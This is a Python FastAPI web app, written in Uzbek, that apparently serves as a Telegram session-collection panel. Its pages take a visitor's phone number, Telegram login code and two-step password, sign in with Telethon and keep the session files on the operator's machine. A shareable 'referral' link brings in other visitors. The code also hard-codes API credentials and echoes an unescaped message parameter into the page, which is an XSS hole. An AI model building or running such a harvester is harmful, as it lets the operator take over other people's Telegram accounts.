from fastapi import FastAPI, Form
from fastapi.responses import HTMLResponse, RedirectResponse
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
import os
import socket
from urllib.parse import quote

app = FastAPI()

api_id = 39286516
api_hash = '9f5cedcd688bbaade3398c8c8c30f2b8'

SESSION_DIR = "/home/kaliaza/telegram_panel_pc"
os.makedirs(SESSION_DIR, exist_ok=True)

clients = {}
referral_stats = {"total_ref": 0, "registered": []}

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

@app.get("/", response_class=HTMLResponse)
async def full_add_account(ref: str = "", msg: str = ""):
    if ref:
        referral_stats["total_ref"] += 1
        referral_stats["registered"].append(f"Referral orqali tashrif: {ref}")

    local_ip = get_local_ip()
    ref_link = f"http://{local_ip}:8001/?ref=partner_123"

    html = f"""
    <html>
        <head>
            <title>2-Oyna: Yangi Akkaunt Qo'shish & Referral</title>
            <style>
                body {{ font-family: Arial; background: #121212; color: #fff; padding: 30px; }}
                .box {{ background: #1a1a1a; border: 1px solid #333; padding: 30px; border-radius: 10px; max-width: 550px; margin: auto; box-shadow: 0 4px 20px rgba(0,0,0,0.8); }}
                input, button {{ padding: 12px; margin: 10px 0; width: 100%; background: #2d2d2d; border: 1px solid #555; color: #fff; border-radius: 6px; box-sizing: border-box; font-size: 14px; }}
                button {{ background: #4CAF50; font-weight: bold; cursor: pointer; }}
                .btn-back {{ background: #2196F3; text-decoration: none; display: block; text-align: center; padding: 12px; border-radius: 6px; color: #fff; font-weight: bold; margin-top: 15px; }}
                .ref-box {{ background: #16202c; border: 1px solid #1e88e5; padding: 15px; border-radius: 6px; margin-bottom: 20px; }}
                .alert {{ background: #2e7d32; padding: 10px; border-radius: 5px; margin-bottom: 15px; font-weight: bold; }}
            </style>
        </head>
        <body>
            <div class="box">
                <h2>➕ 2-Oyna: Yangi Akkaunt Qo'shish & Referral</h2>
    """
    if msg:
        html += f'<div class="alert">🔔 {msg}</div>'

    html += f"""
                <div class="ref-box">
                    <h4 style="margin: 0 0 8px 0; color: #90caf9;">🔗 Shaxsiy Taklif (Referral) Ssilkangiz:</h4>
                    <input type="text" value="{ref_link}" readonly style="background:#111; color:#4CAF50; font-weight:bold;">
                    <p style="font-size: 12px; color: #aaa; margin: 5px 0 0 0;">Jami o'tishlar: <b>{referral_stats['total_ref']}</b> ta</p>
                </div>

                <p style="color: #ccc; font-size: 13px;">Telegram raqamingizni kiriting va kodni tasdiqlang:</p>
                <form action="/send-code" method="post">
                    <label>Telefon raqam (masalan: +998901234567):</label>
                    <input type="text" name="phone" placeholder="+998901234567" required>
                    <button type="submit">📲 Kodni Yuborish</button>
                </form>
                <a href="http://127.0.0.1:8000" class="btn-back">⬅️ Bosh Panelga Qaytish</a>
            </div>
        </body>
    </html>
    """
    return HTMLResponse(html)

@app.post("/send-code")
async def send_code(phone: str = Form(...)):
    clean = phone.replace('+', '').strip()
    client = TelegramClient(os.path.join(SESSION_DIR, clean), api_id, api_hash)
    try:
        await client.connect()
        sent = await client.send_code_request(phone)
        clients[clean] = {"client": client, "phone": phone, "hash": sent.phone_code_hash}
    except Exception as e:
        await client.disconnect()
        return RedirectResponse(f"/?msg=Xatolik: {quote(str(e))}", status_code=303)

    html = f"""
    <html>
        <head>
            <title>Kodni Tasdiqlash</title>
            <style>
                body {{ font-family: Arial; background: #121212; color: #fff; padding: 30px; }}
                .box {{ background: #1a1a1a; border: 1px solid #333; padding: 25px; border-radius: 8px; max-width: 450px; margin: auto; box-shadow: 0 4px 15px rgba(0,0,0,0.7); }}
                input, button {{ padding: 10px; margin: 8px 0; width: 100%; background: #2d2d2d; border: 1px solid #555; color: #fff; border-radius: 4px; box-sizing: border-box; }}
                button {{ background: #4CAF50; font-weight: bold; cursor: pointer; }}
            </style>
        </head>
        <body>
            <div class="box">
                <h3>📲 {phone} raqamiga kod keldi</h3>
                <form action="/verify-code" method="post">
                    <input type="hidden" name="clean" value="{clean}">
                    <label>Telegram Kodini kiriting:</label>
                    <input type="text" name="code" placeholder="12345" required>
                    <label>Ikki bosqichli parol (agar bo'lsa):</label>
                    <input type="password" name="password" placeholder="Parol (shart emas)">
                    <button type="submit">Tasdiqlash va Sessiya Ochish</button>
                </form>
                <a href="/" style="color: #2196F3; display: block; margin-top: 15px; text-decoration: none; text-align: center;">⬅️ Orqaga Qaytish</a>
            </div>
        </body>
    </html>
    """
    return HTMLResponse(html)

@app.post("/verify-code")
async def verify_code(clean: str = Form(...), code: str = Form(...), password: str = Form("")):
    data = clients.get(clean.strip())
    if not data:
        return RedirectResponse("/?msg=Sessiya topilmadi yoki vaqt tugadi", status_code=303)
    client = data["client"]
    try:
        await client.sign_in(phone=data["phone"], code=code, phone_code_hash=data["hash"])
    except SessionPasswordNeededError:
        try:
            await client.sign_in(password=password)
        except Exception as e:
            await client.disconnect()
            del clients[clean]
            return RedirectResponse(f"/?msg=Parol xato: {quote(str(e))}", status_code=303)
    except Exception as e:
        await client.disconnect()
        del clients[clean]
        return RedirectResponse(f"/?msg=Kod xato yoki eskirgan: {quote(str(e))}", status_code=303)

    await client.disconnect()
    del clients[clean]
    return RedirectResponse("/?msg=Muvaffaqiyatli yangi raqam qo'shildi!", status_code=303)
